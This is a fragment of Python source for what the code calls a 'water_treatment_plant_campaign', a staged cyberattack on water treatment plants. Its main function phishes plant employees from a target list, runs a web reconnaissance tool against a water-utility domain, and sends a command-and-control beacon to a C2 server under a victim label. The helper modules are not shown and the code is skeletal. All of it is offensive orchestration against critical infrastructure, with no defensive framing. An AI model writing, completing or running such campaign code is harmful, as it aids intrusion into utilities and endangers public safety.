...
def main():
    """
    Main function to run the water_treatment_plant_campaign campaign.
    """
    print(f"[*] Starting water_treatment_plant_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("water_treatment_plants_employees.txt")
    run_tool("apt_web_recon.js", "--target water_treatment_plants.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-WATER_TREATMENT_PLANTS-01")
